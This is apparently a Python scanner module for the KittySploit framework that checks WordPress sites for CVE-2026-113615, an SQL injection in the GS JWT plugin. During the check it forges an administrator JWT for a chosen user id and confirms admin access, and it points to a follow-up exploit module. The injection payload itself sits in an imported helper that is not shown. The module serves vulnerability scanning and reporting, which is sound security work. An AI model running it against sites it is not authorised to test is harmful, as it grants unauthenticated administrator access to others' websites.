#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detect CVE-2026-113615 GS JWT WordPress plugin SQLi (verify-otp)."""

import json

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress
from lib.scanner.http.gs_jwt_wp import GS_JWT_NAMESPACE, forge_gs_jwt_token, verify_gs_jwt_admin


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "GS JWT CVE-2026-113615 Detect",
        "description": (
            "CVE-2026-113615: GS JWT Authentication for WP REST API <= 1.0.0 — SQL injection "
            "on POST /wp-json/gs-jwt/v1/verify-otp allows forging a JWT for an arbitrary user id. "
            "Read-only: validates administrator role via /wp/v2/users/me."
        ),
        "author": ["thiscitze", "KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-113615"],
        "tags": ["wordpress", "wp-plugin", "sqli", "jwt", "cve-2026-113615", "scanner"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-113615",
            "https://github.com/thiscitze/cve-2026-113615-poc",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["network_probe"],
            "expected_requests": 4,
            "approval_required": True,
            "produces": ["risk_signals", "credentials"],
            "requires": {"tech_hints_any": ["wordpress"]},
            "chain": {
                "suggested_followups": [
                    "exploits/multi/http/gs_jwt_cve_2026_113615_sqli",
                ],
            },
        },
    }

    forge_uid = OptInteger(1, "User id to forge JWT for during detect", required=False, advanced=True)

    def _wp_path(self, route: str) -> str:
        base = self.wp_normalize_base_path(getattr(self, "path", "/"))
        route = route if route.startswith("/") else f"/{route}"
        if route.startswith("/wp-json"):
            return f"{base}{route}" if base != "/" else route
        return f"{base}/wp-json{route}"

    def _rest_ready(self) -> bool:
        response = self.http_request(method="GET", path=self.wp_json_index_path(), timeout=12)
        if not response or int(response.status_code or 0) != 200:
            return False
        try:
            data = response.json()
        except Exception:
            try:
                data = json.loads(response.text or "")
            except Exception:
                return False
        namespaces = (data or {}).get("namespaces") or []
        return any(GS_JWT_NAMESPACE in str(ns) or str(ns).startswith("gs-jwt") for ns in namespaces)

    def run(self):
        if not self._rest_ready():
            print_status("WordPress REST API unavailable or gs-jwt namespace not listed")
            return False

        uid = int(self.forge_uid or 1)

        def _post(route, payload):
            return self.http_request(
                method="POST",
                path=self._wp_path(route),
                json=payload,
                headers={"Content-Type": "application/json"},
                timeout=20,
            )

        info = forge_gs_jwt_token(lambda r, p: _post(r, p), uid=uid)
        token = info.get("token") or ""
        if not token:
            print_status(info.get("error") or "No JWT returned (patched or plugin inactive)")
            return False

        def _get(route, headers=None):
            return self.http_request(method="GET", path=self._wp_path(route), headers=headers or {}, timeout=15)

        ok, profile = verify_gs_jwt_admin(
            lambda r, headers=None: _get(r, headers=headers),
            token,
        )
        if not ok:
            print_status("JWT issued but user is not administrator — try another uid")
            return False

        name = profile.get("name") or profile.get("slug") or str(uid)
        self.report_finding(
            "GS JWT unauthenticated SQLi to administrator JWT (CVE-2026-113615)",
            severity="critical",
            evidence={"uid": uid, "user": name, "cve": "CVE-2026-113615"},
            impact={"summary": "Full WordPress administrator API access without credentials."},
            remediation={"summary": "Remove gs-jwt-auth plugin; no fixed release at disclosure."},
        )
        self.set_info(
            severity="critical",
            cve="CVE-2026-113615",
            reason=f"Administrator JWT forged for uid {uid} ({name})",
            confidence="high",
        )
        return True
